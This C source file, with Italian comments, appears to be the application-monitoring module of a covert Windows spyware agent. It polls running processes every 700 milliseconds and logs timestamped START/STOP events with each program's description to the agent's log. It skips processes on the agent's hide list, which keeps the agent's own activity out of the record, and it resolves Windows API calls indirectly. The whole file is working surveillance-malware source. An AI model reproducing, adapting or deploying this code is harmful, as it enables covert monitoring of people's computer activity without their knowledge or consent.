
BOOL bPM_ApplicationStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
BOOL bPM_appcp = FALSE; // Semaforo per l'uscita del thread
HANDLE hApplicationThread = NULL;

#define PROC_DESC_LEN 100

typedef struct _application_list_entry_struct {
	BOOL is_free;
	WCHAR proc_name[50];
	WCHAR proc_desc[PROC_DESC_LEN];
	DWORD PID;
	BOOL is_hidden;
	BOOL still_present;
} application_list_entry_struct;
application_list_entry_struct *g_application_list = NULL;
DWORD g_application_count = 0;

void GetProcessDescription(DWORD PID, WCHAR *description, DWORD desc_len_in_word)
{
	struct LANGANDCODEPAGE {
	  WORD wLanguage;
	  WORD wCodePage;
	} *lpTranslate;

	UINT cbTranslate = 0, cbDesc = 0;
	HANDLE hproc;
	BYTE *file_info;
	WCHAR *desc_ptr;
	DWORD info_size, dummy;
	WCHAR process_path[MAX_PATH+1];
	WCHAR file_desc_name[128];
	
	// Se non riesce a prendere la desc, torna una stringa vuota
	if (desc_len_in_word > 0)
		description[0] = 0;

	if ( (hproc = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PID)) == NULL ) 
		return;

	if (FNC(GetModuleFileNameExW)(hproc, NULL, process_path, sizeof(process_path)/sizeof(WCHAR)) == 0) {
		CloseHandle(hproc);
		return;
	}
	CloseHandle(hproc);

	if ( (info_size = FNC(GetFileVersionInfoSizeW)(process_path, &dummy)) == 0 )
		return;
	if ( (file_info = (BYTE *)malloc(info_size)) == NULL )
		return;
	if (!FNC(GetFileVersionInfoW)(process_path, NULL, info_size, file_info)) {
		free(file_info);
		return;
	}
	
	if (!FNC(VerQueryValueW)(file_info, L"\\VarFileInfo\\Translation", (LPVOID*)&lpTranslate, &cbTranslate) || cbTranslate < sizeof(struct LANGANDCODEPAGE)) {
		free(file_info);
		return;
	}
	swprintf_s(file_desc_name, sizeof(file_desc_name)/sizeof(WCHAR), L"\\StringFileInfo\\%04x%04x\\FileDescription", lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);

	if (FNC(VerQueryValueW)(file_info, file_desc_name, (LPVOID *)&desc_ptr, &cbDesc) && cbDesc>0) 
		_snwprintf_s(description, desc_len_in_word, _TRUNCATE, L"%s", desc_ptr);		

	free(file_info);
}

BOOL ApplicationInsertInList(WCHAR *proc_name, WCHAR *proc_desc, DWORD PID)
{
	DWORD i;
	application_list_entry_struct *temp_array = NULL;
	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
	BOOL is_hidden = FALSE;

	SET_PID_HIDE_STRUCT(pid_hide, PID);
	if (AM_IsHidden(HIDE_PID, &pid_hide))
		is_hidden = TRUE;

	// Cerca di inserirlo in un elemento libero 
	for (i=0; i<g_application_count; i++) {
		if (g_application_list[i].is_free) {
			_snwprintf_s(g_application_list[i].proc_name, sizeof(g_application_list[i].proc_name)/sizeof(WCHAR), _TRUNCATE, L"%s", proc_name);		
			_snwprintf_s(g_application_list[i].proc_desc, sizeof(g_application_list[i].proc_desc)/sizeof(WCHAR), _TRUNCATE, L"%s", proc_desc);		
			g_application_list[i].PID = PID;
			g_application_list[i].still_present = TRUE;
			g_application_list[i].is_hidden = is_hidden;
			g_application_list[i].is_free = FALSE;

			if (is_hidden)
				return FALSE; //Non lo fa scrivere nel log
			return TRUE;
		}
	}

	// Altrimenti rialloca il buffer ingrandendolo
	if ( !(temp_array = (application_list_entry_struct *)realloc(g_application_list, (g_application_count+1)*sizeof(application_list_entry_struct))) )
		return FALSE;
	
	i = g_application_count;
	g_application_list = temp_array;
	g_application_count++;

	_snwprintf_s(g_application_list[i].proc_name, sizeof(g_application_list[i].proc_name)/sizeof(WCHAR), _TRUNCATE, L"%s", proc_name);		
	_snwprintf_s(g_application_list[i].proc_desc, sizeof(g_application_list[i].proc_desc)/sizeof(WCHAR), _TRUNCATE, L"%s", proc_desc);		
	g_application_list[i].PID = PID;
	g_application_list[i].still_present = TRUE;
	g_application_list[i].is_hidden = is_hidden;
	g_application_list[i].is_free = FALSE;

	if (is_hidden)
		return FALSE; //Non lo fa scrivere nel log
	return TRUE;
}

void ReportApplication(WCHAR *proc_name, WCHAR *proc_desc, BOOL is_started)
{
	// Costruisce e scrive il log sequenziale
	bin_buf tolog;
	struct tm tstamp;
	DWORD delimiter = ELEM_DELIMITER;

	// XXX Non logga il processo SearchFilter
	if (!wcsicmp(proc_name, L"SearchFilterHost.exe"))
		return;

	GET_TIME(tstamp);
	tolog.add(&tstamp, sizeof(tstamp));
	tolog.add(proc_name, wcslen(proc_name)*2+sizeof(WCHAR));
	if (is_started)
		tolog.add(L"START", wcslen(L"START")*2+sizeof(WCHAR));
	else
		tolog.add(L"STOP", wcslen(L"STOP")*2+sizeof(WCHAR));
	tolog.add(proc_desc, wcslen(proc_desc)*2+sizeof(WCHAR));
	tolog.add(&delimiter, sizeof(DWORD));
	LOG_ReportLog(PM_APPLICATIONAGENT, tolog.get_buf(), tolog.get_len());
}

DWORD WINAPI MonitorNewApps(DWORD dummy)
{
	HANDLE proc_list;
	PROCESSENTRY32W lppe;
	DWORD i;
	BOOL first_loop = FALSE;
	BOOL proc_found;
	WCHAR proc_desc[PROC_DESC_LEN];

	// Alla prima passata costruisce la lista (senza riportare i delta)
	if (!g_application_list)
		first_loop = TRUE; 

	LOOP {
		// Resetta a tutti i processi il flag per vedere quelli che ci sono ancora
		for (i=0; i<g_application_count; i++)
			g_application_list[i].still_present = FALSE;

		// Cicla i processi attivi 
		if ( (proc_list = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL)) != INVALID_HANDLE_VALUE ) {
			lppe.dwSize = sizeof(PROCESSENTRY32W);
			if (FNC(Process32FirstW)(proc_list,  &lppe)) {
				do {
					proc_found = FALSE;
					// Vede se e' gia' in lista
					for (i=0; i<g_application_count; i++) {
						// lo marca come presente
						if (!g_application_list[i].is_free && g_application_list[i].PID == lppe.th32ProcessID) {
							proc_found = TRUE;
							g_application_list[i].still_present = TRUE;
							break;
						}
					}
					// altrimenti lo aggiunge
					if (!proc_found) {
						GetProcessDescription(lppe.th32ProcessID, proc_desc, PROC_DESC_LEN);
						if (ApplicationInsertInList(lppe.szExeFile, proc_desc, lppe.th32ProcessID) && !first_loop) 
							ReportApplication(lppe.szExeFile, proc_desc, TRUE);
					}
				} while(FNC(Process32NextW)(proc_list, &lppe));
			}
			CloseHandle(proc_list);
		}

		// Riporta e cancella i processi che non sono piu' presenti
		for (i=0; i<g_application_count; i++) {
			if (!g_application_list[i].is_free && !g_application_list[i].still_present) {
				if (!g_application_list[i].is_hidden)
					ReportApplication(g_application_list[i].proc_name, g_application_list[i].proc_desc, FALSE);
				g_application_list[i].is_free = TRUE;
			}
		}

		first_loop = FALSE;
		CANCELLATION_POINT(bPM_appcp);
		Sleep(700);
	}
}


DWORD __stdcall PM_ApplicationStartStop(BOOL bStartFlag, BOOL bReset)
{
	DWORD dummy;

	if (bStartFlag) {
		if (!bPM_ApplicationStarted) {
			LOG_InitAgentLog(PM_APPLICATIONAGENT);
			hApplicationThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorNewApps, NULL, 0, &dummy);
		}
	} else {
		if (bPM_ApplicationStarted) {
			QUERY_CANCELLATION(hApplicationThread, bPM_appcp);
			LOG_StopAgentLog(PM_APPLICATIONAGENT);
		}

		// Solo se e' stato stoppato esplicitamente cancella la lista 
		if (bReset) {
			SAFE_FREE(g_application_list);
			g_application_count = 0;
		}
	}

	bPM_ApplicationStarted = bStartFlag;

	return 1;
}


DWORD __stdcall PM_ApplicationInit(JSONObject elem)
{
	return 1;
}


void PM_ApplicationRegister()
{
	AM_MonitorRegister(L"application", PM_APPLICATIONAGENT, NULL, (BYTE *)PM_ApplicationStartStop, (BYTE *)PM_ApplicationInit, NULL);
}